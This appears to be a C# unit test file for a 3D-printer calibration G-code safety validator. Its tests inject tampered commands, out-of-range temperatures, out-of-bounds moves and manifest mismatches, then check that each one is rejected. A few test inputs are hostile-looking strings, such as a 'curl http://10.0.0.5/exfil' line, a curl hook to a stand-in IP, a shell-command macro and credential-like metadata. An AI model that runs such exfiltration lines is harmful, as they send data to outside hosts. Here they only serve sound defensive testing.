using Farm.Web.Api.Services.Calibration.Generation;
using FluentAssertions;

namespace Farm.Web.Api.Tests.Services.Calibration.Generation;

/// <summary>
/// Adversarial tests for the reject-only static G-code safety validator.
/// </summary>
/// <remarks>
/// The safety ceilings asserted here (temperature, pressure advance, retraction, volumetric
/// flow) are an intentional PFD divergence from OrcaSlicer's own calibration wizard, which
/// applies no equivalent static rejection pass. See
/// <c>docs/CALIBRATION_DIVERGENCES.md</c> for the full rationale and code pointers, and for
/// other known, deliberate PFD/OrcaSlicer calibration divergences.
/// </remarks>
public sealed class CalibrationGcodeSafetyValidatorTests
{
    private static CalibrationGenerationPipeline.Result Run() =>
        CalibrationGenerationPipeline.Run(CalibrationMethod.Temperature, 0.4m, directDrive: true);

    private static IReadOnlyList<string> Codes(
        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result) =>
        result.Problems.Select(problem => problem.Code).ToArray();

    [Fact]
    public void Validate_WithUnmodifiedGeneratedProgram_ReturnsCleanReport()
    {
        CalibrationGenerationPipeline.Result run = Run();

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforePromotion);

        _ = result.Problems.Should().BeEmpty();
        _ = result.Value!.CommandCount.Should().BeGreaterThan(0);
        _ = result.Value.Checkpoint.Should().Be(CalibrationSafetyCheckpoint.BeforePromotion);
    }

    [Fact]
    public void Validate_WithUnspecifiedCheckpoint_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.Unspecified);

        _ = Codes(result).Should().Contain("manifest_mismatch");
    }

    [Fact]
    public void Validate_WithInjectedTuningTower_RejectsExplicitly()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M220 S100\n",
            "M220 S100\nTUNING_TOWER COMMAND=SET_PRESSURE_ADVANCE PARAMETER=ADVANCE START=0 FACTOR=.005\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_tuning_tower_forbidden");
    }

    [Theory]
    [InlineData("RUN_SHELL_COMMAND CMD=backup", "gcode_command_not_allowlisted")]
    [InlineData("M118 exfiltrate", "gcode_command_not_allowlisted")]
    [InlineData("SAVE_CONFIG", "gcode_command_not_allowlisted")]
    [InlineData("FIRMWARE_RESTART", "gcode_command_not_allowlisted")]
    [InlineData("M118 curl http://10.0.0.5/exfil", "gcode_contains_host_command")]
    public void Validate_WithNonAllowlistedCommand_Rejects(string injected, string expectedCode)
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M107\n",
            $"M107\n{injected}\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforePromotion,
                tampered);

        _ = Codes(result).Should().Contain(expectedCode);
    }

    [Fact]
    public void Validate_WithNozzleTemperatureAboveTheCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M104 S240\n",
            "M104 S420\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_temperature_above_limit");
    }

    [Fact]
    public void Validate_WithBedTemperatureAboveTheCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M140 S60\n",
            "M140 S220\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_temperature_above_limit");
    }

    [Fact]
    public void Validate_WithMoveOutsideTheBuildVolume_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M107\nG92 E0\n",
            "M107\nG92 E0\nG0 X900.000 Y900.000 Z1.000 F18000\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeQueueing,
                tampered);

        _ = Codes(result).Should().Contain("gcode_motion_outside_build_volume");
    }

    [Fact]
    public void Validate_WithMoveOutsideThePrintablePolygon_Rejects()
    {
        CalibrationGenerationPipeline.Result run = RunWithBed(
            printablePolygon:
            [
                new CalibrationBedPoint(60m, 60m),
                new CalibrationBedPoint(175m, 60m),
                new CalibrationBedPoint(175m, 175m),
                new CalibrationBedPoint(60m, 175m),
            ]);
        string tampered = run.Annotated!.Gcode.Replace(
            "M107\nG92 E0\n",
            "M107\nG92 E0\nG0 X5.000 Y5.000 Z1.000 F18000\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeQueueing,
                tampered);

        _ = Codes(result).Should().Contain("gcode_motion_outside_printable_polygon");
    }

    [Fact]
    public void Validate_WithMoveIntoAnExcludedRegion_Rejects()
    {
        CalibrationGenerationPipeline.Result run = RunWithBed(
            excludedRegions:
            [
                new CalibrationExcludedRegion(
                    "purge-bucket",
                    [
                        new CalibrationBedPoint(0m, 0m),
                        new CalibrationBedPoint(20m, 0m),
                        new CalibrationBedPoint(20m, 20m),
                        new CalibrationBedPoint(0m, 20m),
                    ]),
            ]);
        string tampered = run.Annotated!.Gcode.Replace(
            "M107\nG92 E0\n",
            "M107\nG92 E0\nG0 X10.000 Y10.000 Z1.000 F18000\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeQueueing,
                tampered);

        _ = Codes(result).Should().Contain("gcode_motion_inside_excluded_region");
    }

    [Fact]
    public void Validate_WithPressureAdvanceAboveTheDirectDriveCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "SET_PRESSURE_ADVANCE ADVANCE=0.0300\n",
            "SET_PRESSURE_ADVANCE ADVANCE=1.9000\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_pressure_advance_out_of_range");
    }

    [Fact]
    public void Validate_WithRetractionAboveTheSafeCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "G1 E-0.800 F2400\n",
            "G1 E-9.500 F2400\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_retraction_above_limit");
    }

    [Fact]
    public void Validate_WithFeedRateAboveTheTravelCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M107\nG92 E0\n",
            "M107\nG92 E0\nG0 X120.000 Y120.000 Z1.000 F90000\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_speed_above_limit");
    }

    [Fact]
    public void Validate_WithAccelerationAboveTheCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M204 S8000\n",
            "M204 S60000\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_acceleration_above_limit");
    }

    [Fact]
    public void Validate_WithVolumetricFlowAboveTheCeiling_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "M107\nG92 E0\n",
            "M107\nG92 E0\nG0 X100.000 Y100.000 Z0.200 F18000\n" +
            "G1 X110.000 Y100.000 E5.00000 F7200\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_volumetric_flow_above_limit");
    }

    [Fact]
    public void Validate_WithMissingFinalReset_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode
            .Replace("TURN_OFF_HEATERS\n", string.Empty, StringComparison.Ordinal)
            .Replace("M84\n", string.Empty, StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeArtifactCompletion,
                tampered);

        _ = Codes(result).Should().Contain("gcode_missing_final_reset");
    }

    [Fact]
    public void Validate_WithMissingHoming_RejectsUnsafeInitialization()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode.Replace(
            "G28\n",
            string.Empty,
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_unsafe_initialization");
    }

    [Fact]
    public void Validate_WithSegmentTransitionThatDoesNotRetract_RejectsUnsafeTransition()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string transition = $"{CalibrationGcodeMarkers.SegmentTransition} FROM=0 TO=1\n" +
            "G1 E-0.800 F2400\n";
        string tampered = run.Annotated!.Gcode.Replace(
            transition,
            $"{CalibrationGcodeMarkers.SegmentTransition} FROM=0 TO=1\n",
            StringComparison.Ordinal);

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeStart,
                tampered);

        _ = Codes(result).Should().Contain("gcode_unsafe_segment_transition");
    }

    [Theory]
    [InlineData(";PF_META note=https://internal.example.local/secret", "gcode_contains_private_url")]
    [InlineData(";PF_META note=C:\\secrets\\worker.key", "gcode_contains_filesystem_path")]
    [InlineData(";PF_META note=/var/lib/printfarmer/worker.key", "gcode_contains_filesystem_path")]
    [InlineData(";PF_META api_key=super-secret", "gcode_contains_credential")]
    [InlineData(";PF_META hook=curl http://198.51.100.7", "gcode_contains_host_command")]
    public void Validate_WithUnredactedProvenanceLine_Rejects(string injected, string expectedCode)
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = injected + "\n" + run.Annotated!.Gcode;

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforePromotion,
                tampered);

        _ = Codes(result).Should().Contain(expectedCode);
    }

    [Fact]
    public void Validate_WithGcodeThatDoesNotMatchTheManifestDigest_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        string tampered = run.Annotated!.Gcode + ";PF_META tail=1\n";

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforePromotion,
                tampered);

        _ = Codes(result).Should().Contain("gcode_hash_mismatch");
    }

    [Fact]
    public void Validate_WithAdvancedPrinterConfigurationRevision_RejectsStaleConfiguration()
    {
        CalibrationGenerationPipeline.Result run = Run();

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforeQueueing,
                currentRevision: 4321);

        _ = Codes(result).Should().Contain("printer_configuration_stale");
    }

    [Fact]
    public void Validate_WithManifestReferencingADifferentSpecification_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        CalibrationGcodeManifest tampered = run.Annotated!.Manifest with
        {
            SpecificationSha256 = new string('c', 64),
        };

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            new CalibrationGcodeSafetyValidator().Validate(new CalibrationGcodeSafetyRequest(
                run.Specification!,
                run.Plan!,
                tampered,
                run.Annotated.Gcode,
                CalibrationSafetyCheckpoint.BeforePromotion,
                run.Specification!.Document.PrinterConfigurationRevision,
                CalibrationGenerationTestData.NowUtc));

        _ = Codes(result).Should().Contain("specification_hash_mismatch");
    }

    [Fact]
    public void Validate_WithManifestReferencingADifferentProfile_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        CalibrationGcodeManifest tampered = run.Annotated!.Manifest with
        {
            FilamentProfileSha256 = new string('d', 64),
        };

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            new CalibrationGcodeSafetyValidator().Validate(new CalibrationGcodeSafetyRequest(
                run.Specification!,
                run.Plan!,
                tampered,
                run.Annotated.Gcode,
                CalibrationSafetyCheckpoint.BeforePromotion,
                run.Specification!.Document.PrinterConfigurationRevision,
                CalibrationGenerationTestData.NowUtc));

        _ = Codes(result).Should().Contain("profile_hash_mismatch");
    }

    [Fact]
    public void Validate_WithManifestDeclaringAnUnsupportedDialect_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        CalibrationGcodeManifest tampered = run.Annotated!.Manifest with
        {
            GcodeDialect = "Marlin",
        };

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            new CalibrationGcodeSafetyValidator().Validate(new CalibrationGcodeSafetyRequest(
                run.Specification!,
                run.Plan!,
                tampered,
                run.Annotated.Gcode,
                CalibrationSafetyCheckpoint.BeforePromotion,
                run.Specification!.Document.PrinterConfigurationRevision,
                CalibrationGenerationTestData.NowUtc));

        _ = Codes(result).Should().Contain("gcode_dialect_unsupported");
    }

    [Fact]
    public void Validate_WithManifestDeclaringAnUnpinnedSlicerVersion_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();
        CalibrationGcodeManifest tampered = run.Annotated!.Manifest with
        {
            SlicerVersion = "2.2.0",
        };

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            new CalibrationGcodeSafetyValidator().Validate(new CalibrationGcodeSafetyRequest(
                run.Specification!,
                run.Plan!,
                tampered,
                run.Annotated.Gcode,
                CalibrationSafetyCheckpoint.BeforePromotion,
                run.Specification!.Document.PrinterConfigurationRevision,
                CalibrationGenerationTestData.NowUtc));

        _ = Codes(result).Should().Contain("slicer_version_unsupported");
    }

    [Fact]
    public void Validate_WithEmptyProgram_Rejects()
    {
        CalibrationGenerationPipeline.Result run = Run();

        CalibrationGenerationResult<CalibrationGcodeSafetyReport> result =
            CalibrationGenerationPipeline.Validate(
                run,
                CalibrationSafetyCheckpoint.BeforePromotion,
                string.Empty);

        _ = Codes(result).Should().Contain("gcode_malformed");
    }

    [Fact]
    public void Generate_PressureAdvanceLine_KeepsEveryCoordinateInsideTheFootprint()
    {
        CalibrationGenerationPipeline.Result run = CalibrationGenerationPipeline.Run(
            CalibrationMethod.PressureAdvanceLine,
            0.4m,
            directDrive: true);

        _ = run.Problems.Should().BeEmpty();
        CalibrationFootprint footprint = run.Specification!.Document.Footprint;
        foreach (string line in run.Annotated!.Gcode.Split('\n'))
        {
            if (!line.StartsWith("G0 X", StringComparison.Ordinal) &&
                !line.StartsWith("G1 X", StringComparison.Ordinal))
            {
                continue;
            }

            decimal x = ReadAxis(line, " X");
            decimal y = ReadAxis(line, " Y");
            _ = x.Should().BeInRange(footprint.MinX, footprint.MaxX);
            _ = y.Should().BeInRange(footprint.MinY, footprint.MaxY);
        }
    }

    [Fact]
    public void Generate_PressureAdvancePattern_BoundsEveryExtrusionAmount()
    {
        CalibrationGenerationPipeline.Result run = CalibrationGenerationPipeline.Run(
            CalibrationMethod.PressureAdvancePattern,
            0.4m,
            directDrive: true);

        _ = run.Problems.Should().BeEmpty();
        foreach (string line in run.Annotated!.Gcode.Split('\n'))
        {
            if (!line.StartsWith("G1 X", StringComparison.Ordinal) ||
                !line.Contains(" E", StringComparison.Ordinal))
            {
                continue;
            }

            decimal extrusion = ReadAxis(line, " E");
            _ = extrusion.Should().BeInRange(0m, 5m);
        }
    }

    [Fact]
    public void Generate_PressureAdvanceLineAndPattern_EmitOnlyTrustedServerCommands()
    {
        foreach (CalibrationMethod method in new[]
        {
            CalibrationMethod.PressureAdvanceLine,
            CalibrationMethod.PressureAdvancePattern,
        })
        {
            CalibrationGenerationPipeline.Result run =
                CalibrationGenerationPipeline.Run(method, 0.4m, directDrive: true);

            _ = run.Problems.Should().BeEmpty();
            _ = run.Program!.BodySource.Should().Be(CalibrationGcodeBodySource.ServerGenerated);
            _ = run.Annotated!.Gcode.Should().NotContain(KlipperCalibrationCommands.TuningTower);
            _ = run.Annotated.Gcode.Should().Contain("SET_PRESSURE_ADVANCE ADVANCE=");
        }
    }

    private static CalibrationGenerationPipeline.Result RunWithBed(
        IReadOnlyList<CalibrationBedPoint>? printablePolygon = null,
        IReadOnlyList<CalibrationExcludedRegion>? excludedRegions = null)
    {
        CalibrationGenerationContext baseline = CalibrationGenerationTestData.Context();
        CalibrationGenerationContext context = baseline with
        {
            Bed = baseline.Bed with
            {
                PrintablePolygon = printablePolygon ?? baseline.Bed.PrintablePolygon,
                ExcludedRegions = excludedRegions ?? baseline.Bed.ExcludedRegions,
            },
        };

        CalibrationSpecification specification = CalibrationGenerationTestData.Compiler()
            .Compile(context, new TemperatureCalibrationOptions()).Value!;
        CalibrationValidatedModel model = new CalibrationModelValidator()
            .ValidateGeneratedGeometryAsync(
                new CalibrationGeneratedGeometry(
                    CalibrationGenerationPipeline.ModelContent,
                    "calibration-body.stl"),
                specification,
                CancellationToken.None)
            .GetAwaiter()
            .GetResult()
            .Value!;
        OrcaCalibrationPlan plan = new OrcaCalibrationPlanCompiler()
            .Compile(specification, model).Value!;
        KlipperCalibrationProgram program = new KlipperCalibrationGcodeGenerator()
            .Generate(specification, plan).Value!;
        AnnotatedCalibrationGcode annotated = new CalibrationGcodeAnnotator()
            .Annotate(specification, plan, model, program).Value!;

        return new CalibrationGenerationPipeline.Result(
            specification,
            model,
            plan,
            program,
            annotated,
            []);
    }

    private static decimal ReadAxis(string line, string key)
    {
        int start = line.IndexOf(key, StringComparison.Ordinal);
        if (start < 0)
        {
            return 0m;
        }

        start += key.Length;
        int end = start;
        while (end < line.Length &&
            (char.IsAsciiDigit(line[end]) || line[end] == '.' || line[end] == '-'))
        {
            end++;
        }

        return decimal.Parse(
            line.AsSpan(start, end - start),
            System.Globalization.NumberStyles.Float,
            System.Globalization.CultureInfo.InvariantCulture);
    }
}
